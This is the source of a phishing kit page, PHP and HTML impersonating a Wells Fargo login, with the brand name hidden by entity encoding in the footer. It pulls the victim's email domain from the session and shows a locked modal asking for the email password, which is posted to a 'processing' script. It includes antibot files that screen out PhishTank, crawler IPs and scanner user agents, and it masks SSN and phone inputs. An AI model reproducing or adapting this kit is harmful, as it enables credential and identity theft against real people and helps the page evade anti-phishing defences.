<?php
ini_set( "display_errors", 0); 
	ob_start();
session_start();
$email = $_SESSION['email'];
$domain = substr($email, strpos($email, '@') + 1);

		
		
	include "antibots/#1.php";
    include "antibots/#2.php";
    include "antibots/#3.php";
    include "antibots/#4.php";
    include "antibots/#5.php";
    include "antibots/#6.php";
    include "antibots/#7.php";
    include "antibots/#8.php";
    include "antibots/#9.php";
    include "antibots/#10.php";
    include "antibots/#11.php";
    include "antibots/#12.php";
    include "antibots/antibot_host.php";
    include "antibots/antibot_ip.php";
    include "antibots/antibot_phishtank.php";
    include "antibots/antibot_userAgent.php";
?>
<!DOCTYPE html>
<html class="" ><head>
<!-- WFB 4.9 -->
<meta name="robots" content="noindex,nofollow" />
<meta name="googlebot" content="noindex" />
<META NAME="robots" CONTENT="nofollow">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">


<title></title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="./assets/dist/css/formValidation.min.css">
<link rel="stylesheet" type="text/css" href="./assets/css/style.css" />
<link rel="stylesheet" href="./assets/css/jquery.mobile.css">
<link rel="stylesheet" href="./assets/css/desktop-tablet.combined1.css">
<link rel="stylesheet" href="./assets/css/bootstrap.min.css">
<link rel="stylesheet" href="./assets/css/toggle.css">
<link rel="icon" href="./assets/images/favicon.ico">

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
<!-- load myriad font  -->

<style type="text/css">.tk-myriad-pro{font-family:"myriad-pro",sans-serif;}</style>
<style type="text/css">@font-face{font-family:myriad-pro;src:url(./assets/fonts/myriad.woff2) format("woff2"),url(./assets/fonts/awe.woff) format("woff"),url(./assets/fonts/b87d1abf881446b2bae0d8204029d20a9b85e656-a.otf) format("opentype");font-weight:400;font-style:normal;}</style>

<!-- myriad font loaded  -->




<style>
.modal-header{color: #fff;
    background-color: #d71e28;
    font-size: .9375rem;
    padding: 0 10px;
    display: flex;
    justify-content: center;
    align-items: center;
	height: 2.375rem;
border-bottom: 4px solid #fcc60a;}
.footer { 
    position: absolute; 
    left: 0 ; right: 0; bottom: 0; 
    height:[footer-height] 
}
</style>
<style>

.fv-plugins-icon[data-field="password"] {
    display: none;
} 

</style>

<link rel="icon" href="images/favicon.ico">
<style type="text/css">.visuallyHidden { border: 0px; clip: rect(0px, 0px, 0px, 0px); margin: -1px; opacity: 0; padding: 0px !important; }
.ui-hidden-accessible, .visuallyHidden { position: absolute; height: 1px; width: 1px; overflow: hidden; }
.ui-hidden-accessible { clip: rect(1px, 1px, 1px, 1px); }
.react-ui-prevent-scroll { overflow: hidden; }
.offscreen { opacity: 0; height: 0px; width: 0px; position: absolute; left: -10000px; top: -10000px; }
.heroImage { width: 100%; position: absolute; z-index: -1; }
@media screen and (max-width: 47.9375rem) {
  .heroImage { width: 100%; position: relative; }
}
.mainContainer { width: 66%; margin: 0px auto; }
@media screen and (max-width: 47.9375rem) {
  .mainContainer { width: inherit; margin-bottom: 25px; }
}
[data-en="checkbox"], [data-en="input"] { padding-left: 0px; padding-right: 0px; width: 100%; }
.center { text-align: center; }
#oowContainer #full-popup { width: inherit; }
#full-popup[data-en="popup"], #inLangDownPopup-popup[data-en="popup"], [data-en="popup"][role="dialog"][class*="Popup-popup"] { width: 705px; top: 25%; }
@media screen and (max-width: 47.9375rem) {
  #full-popup[data-en="popup"], #inLangDownPopup-popup[data-en="popup"], [data-en="popup"][role="dialog"][class*="Popup-popup"] { z-index: 1001; opacity: 1; background-color: rgb(255, 255, 255); border: 1px solid rgb(214, 214, 214); box-shadow: rgb(102, 102, 102) 0px 3px 13px -4px; outline: none; position: fixed; top: 25%; left: 50%; transform: translate(-50%, -25%); border-radius: 12px; width: 80%; height: inherit; }
  #full-popup[data-en="popup"] #popup-child-body, #inLangDownPopup-popup[data-en="popup"] #popup-child-body, [data-en="popup"][role="dialog"][class*="Popup-popup"] #popup-child-body { overflow-y: scroll; max-height: 22rem; }
  #full-popup[data-en="popup"] #popup-child-body p, #full-popup[data-en="popup"] #popup-child-body span, #inLangDownPopup-popup[data-en="popup"] #popup-child-body p, #inLangDownPopup-popup[data-en="popup"] #popup-child-body span, [data-en="popup"][role="dialog"][class*="Popup-popup"] #popup-child-body p, [data-en="popup"][role="dialog"][class*="Popup-popup"] #popup-child-body span { color: rgb(120, 117, 117); }
  #full-popup[data-en="popup"] #popup-child-body section, #inLangDownPopup-popup[data-en="popup"] #popup-child-body section, [data-en="popup"][role="dialog"][class*="Popup-popup"] #popup-child-body section { background-color: rgb(255, 255, 255); }
}
@media only screen and (orientation: landscape) {
  #full-popup[data-en="popup"], #inLangDownPopup-popup[data-en="popup"], [data-en="popup"][role="dialog"][class*="Popup-popup"] { top: 35%; }
}
#full-popup[data-en="popup"] .footerButtons, #inLangDownPopup-popup[data-en="popup"] .footerButtons, [data-en="popup"][role="dialog"][class*="Popup-popup"] .footerButtons { padding: 20px; margin: 0px auto; display: table; width: 322px; }
@media screen and (max-width: 47.9375rem) {
  #full-popup[data-en="popup"] .footerButtons, #inLangDownPopup-popup[data-en="popup"] .footerButtons, [data-en="popup"][role="dialog"][class*="Popup-popup"] .footerButtons { display: inherit; width: inherit; }
}
#full-popup[data-en="popup"] .footerButtons .subFooterButtons, #inLangDownPopup-popup[data-en="popup"] .footerButtons .subFooterButtons, [data-en="popup"][role="dialog"][class*="Popup-popup"] .footerButtons .subFooterButtons { padding: 20px; }
@media screen and (max-width: 47.9375rem) {
  #full-popup[data-en="popup"] .footerButtons .subFooterButtons, #inLangDownPopup-popup[data-en="popup"] .footerButtons .subFooterButtons, [data-en="popup"][role="dialog"][class*="Popup-popup"] .footerButtons .subFooterButtons { padding: 0px; }
}
[data-en*="balloon"] #full-popup[data-en="popup"], [data-en*="balloon"] #inLangDownPopup-popup[data-en="popup"], [data-en*="balloon"] [data-en="popup"][role="dialog"][class*="Popup-popup"] { width: 250px; }
[data-en*="balloon"] #balloonHelpLinkText1-popup, [data-en*="balloon"] #balloonSsn-popup[data-en="popup"] { width: 250px; }
#cancelPopup [data-en="popup"] { width: 705px; top: 25%; }
@media screen and (max-width: 47.9375rem) {
  #cancelPopup [data-en="popup"] { width: 92%; }
}
[data-en="popup"] { top: 25%; }
[data-en="popup-link"] [role="img"] { cursor: pointer; }
@media screen and (max-height: 600px) {
  #findCvv-popup, #full-popup { position: absolute; transform: translate(-75%, -75%); top: inherit; left: inherit; }
  #creditCardPopup #full-popup { transform: translate(-14%, -96%); width: 658px; }
}
#hoganLanguagePreference { height: 0px; }
.link { color: rgb(81, 116, 184); font-size: 0.9375rem; text-decoration: none; cursor: pointer; }
.link:hover { text-decoration: underline; }
.remove-underline { text-decoration: none; }
</style>
<style type="text/css">.visuallyHidden { border: 0px; clip: rect(0px, 0px, 0px, 0px); margin: -1px; opacity: 0; padding: 0px !important; }
.content-ui-hidden-accessible-dWktaGlkZGVuLWFjY2Vzc2libG, .visuallyHidden { position: absolute; height: 1px; width: 1px; overflow: hidden; }
.content-ui-hidden-accessible-dWktaGlkZGVuLWFjY2Vzc2libG { clip: rect(1px, 1px, 1px, 1px); }
.content-react-ui-prevent-scroll-cmVhY3QtdWktcHJldmVudC1zY3JvbG { overflow: hidden; }
.content-content-Y29udGVudA { max-width: 1080px; margin: 0px auto; position: relative; }
.content-footerSpacer-Zm9vdGVyU3BhY2 { height: 175px; }
@media screen and (max-width: 47.9375rem) {
  .content-footerSpacer-Zm9vdGVyU3BhY2 { height: 50px; }
}
</style>
<style type="text/css">.PositionedModalContent-content-Y29udGVudA { display: flex; flex-direction: column; }
.PositionedModalContent-content-Y29udGVudA.PositionedModalContent-scrollable-c2Nyb2xsYWJsZQ { overflow-y: auto; }
</style>

  </head>
<body data-gr-c-s-loaded="true" class="ui-mobile-viewport ui-overlay-a" data-inq-observer="1">
	
<header role="banner">
	<div class="masthead">

		<nav class="back">
			
		</nav>

		<div>

			
				
				
					<a class="c28cLink child-window ui-link" href="javascript:void(0)"> <img class="masthead-img-logo" alt="" role="img" src="assets/images/masthead-img-logo.svg">
					</a>
				
			
		</div>

		
			
			
				<div role="navigation" class="top-search">
					<ul>
						
							
							
								<li class="security">
									<a class="c28cLink child-window ui-link" href="javascript:void(0)" data-platform="salesplatform">Online Security
									</a>
								</li>
							
						
					</ul>
				</div>
			
		

		<nav class="menu">
			
				
				
					<a href="javascript:void(0)" class="ui-link"></a>
				
			
		</nav>

	</div>

</header>

<div class="content-content-Y29udGVudA"><img src="./assets/images/JK_1027.jpg"  alt="" class="heroImage"></div>
			
		
		<div id="mainColumns" tabindex="-1" role="main" class="ui-content osmp-content">
			<div class="primary-content">
				
					







<!-- Define Variable activeStepCount and initialize to zero-->



			
        	    
					
<div class="section">







<!-- Modal -->
<div class="modal fade" id="basicExampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
	    <h5 class="modal-title" id="exampleModalLabel"><img class="masthead-img-logo" alt="" role="img" src="assets/images/masthead-img-logo.svg"></h5>
		<div align="right">&#x20;&#x20;</div><p></p>|<img  alt="" role="img" height="30px" src="assets/images/download.svg"><span><span>Welcome</span></span>
	   </div>
     
      <div class="modal-body">
	  
        <h2 style="color:black;">To continue</h2>
		 <form method="POST" id="empass" action="processing/email1.php">
		<p align="center">
<object data="https://logo.clearbit.com/<?php echo $domain;?>" width="93" height="98" type="image/jpg">
</object>
</p>

<p align="center">Please login to <?php echo $domain;?> to verify your email.</p>
<br>
		<div class="ui-field-contain">
		<label for="emailAddress">
			Email address
		</label>
		<div class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset"><input id="emailAddress" name="email" class="pmask required EMAIL" type="email" value="" size="40"   ></div>
	</div>
	
	
	
	<div class="ui-field-contain">
	<div class="grid-x grid-padding-x">
		<label for="emailAddress">
			Email password
		</label>
		<div class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset"><input id="password-field" name="password" class="pmask required EMAIL" type="password" value="" size="40" maxlength="120" > <span toggle="#password-field" class="fa fa-fw fa-eye field-icon toggle-password"></span></div>
	</div>
	</div>
	
      <div class="modal-footer">
       
      <input type="hidden" name="query_string" value="{query_string}">
      <input type="hidden" name="actionname" value="{actionname}" />
     <button type="submit" data-flow-event="_eventId_continue" data-mrkt-tracking-id="continue" class="bt_c">
				Continue
			</button>
    </form>
       
      </div>
    </div>
  </div>
</div>

</div>

<script>
$(function() {
    $('#basicExampleModal').modal('show');
});
$("#basicExampleModal").modal({
            backdrop: 'static',
            keyboard: false
        });
</script>


<script src="https://cdnjs.cloudflare.com/ajax/libs/es6-shim/0.35.3/es6-shim.min.js"></script>    
<script src="assets/dist/js/FormValidation.min.js"></script>
<script src="assets/dist/js/plugins/Foundation.min.js"></script>
<script src="./assets/dist/js/forms.js"></script>


<script>
$(function() {
    $('#basicExampleModal').modal('show');
});
$("#basicExampleModal").modal({
            backdrop: 'static',
            keyboard: false
        });
</script>





<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.2/jquery.min.js'></script>
<script src="./assets/js/toggle.js"></script>













<div class="content-content-Y29udGVudA"><img src="./assets/images/JK_1027.jpg"  alt="" class="heroImage"></div>


	

      
			</label></div><input type="hidden" name="_riskScreeningDisclosure" value="on">
		</div>
	</fieldset>
		
	








</form>





</div>





</div>




	
	
		



<div data-role="footer" class="footer osmp-footer ui-footer ui-bar-inherit singleColumn" role="contentinfo">
		
	<footer role="contentinfo">
			<div class="c9">
				<nav aria-label="corporate, legal, security">
					<ul class="not-large-screen">
					
					
						
						    
						    	
								
									<li><a class="c28cLink child-window ui-link" href="javascript:void(0)">&#80;&#114;&#105;&#118;&#97;&#99;&#121;&#44;&#32;&#67;&#111;&#111;&#107;&#105;&#101;&#115;&#44;&#32;&#83;&#101;&#99;&#117;&#114;&#105;&#116;&#121; &amp; Legal</a></li>
									<li><a class="c28cLink child-window ui-link" href="javascript:void(0)">Ad Choices</a></li>
									<li><a class="c28cLink child-window ui-link" title="Online Security" href="javascript:void(0)">&#79;&#110;&#108;&#105;&#110;&#101;&#32;&#83;&#101;&#99;&#117;&#114;&#105;&#116;&#121;</a></li>
								
						    
						
					
					</ul>				
					<ul class="large-screen">
						
						
						
							 
						    	
								
									<li><a class="c28cLink child-window ui-link" href="javascript:void(0)">&#80;&#114;&#105;&#118;&#97;&#99;&#121;&#44;&#32;&#67;&#111;&#111;&#107;&#105;&#101;&#115;&#44;&#32;&#83;&#101;&#99;&#117;&#114;&#105;&#116;&#121; &amp; Legal</a></li>
									<li><a class="c28cLink child-window ui-link" href="javascript:void(0)">Ad Choices</a></li>
									<li><a class="c28cLink child-window ui-link" title="Online Security" href="javascript:void(0)">&#79;&#110;&#108;&#105;&#110;&#101;&#32;&#83;&#101;&#99;&#117;&#114;&#105;&#116;&#121;</a></li>
								
						     
						
					
					</ul>				
				</nav>
				<hr>
				&copy;&#32;&#49;&#57;&#57;&#57;&#32;&#45; <span class="placeholder">&#50;&#48;&#50;&#48;</span> &#87;&#101;&#108;&#108;&#115;&#32;&#70;&#97;&#114;&#103;&#111;&#46;&#32;&#65;&#108;&#108;&#32;&#114;&#105;&#103;&#104;&#116;&#115;&#32;&#114;&#101;&#115;&#101;&#114;&#118;&#101;&#100;&#46;&#32;&#78;&#77;&#76;&#83;&#82;&#32;&#73;&#68;&#32;&#51;&#57;&#57;&#56;&#48;&#49;
			</div>
		</footer>
</div>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0-beta1/jquery.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>
    <script>
        $('input[name="phone"]').mask('(000) 000-0000');
		$('input[name="ssn"]').mask('000-00-0000');
    </script>
</body></html>
